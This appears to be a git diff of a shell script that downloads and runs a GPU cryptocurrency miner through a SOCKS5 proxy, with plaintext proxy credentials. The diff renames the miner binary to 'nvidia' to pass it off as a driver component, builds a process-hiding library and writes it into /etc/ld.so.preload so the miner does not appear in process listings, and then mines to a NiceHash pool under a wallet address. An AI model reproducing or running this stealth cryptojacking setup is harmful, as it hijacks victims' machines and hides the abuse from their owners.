@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.15.39.186:1080
+socks5 = gpusocks2.wot.mrface.com:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -35,14 +35,14 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
+chmod +x nvidia
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
+unzip magicNvidia.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=ssl://3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./nvidia -a ETHASH --pool daggerhashimoto.usa-west.nicehash.com:33353 --tls on --user 3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5 --worker nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
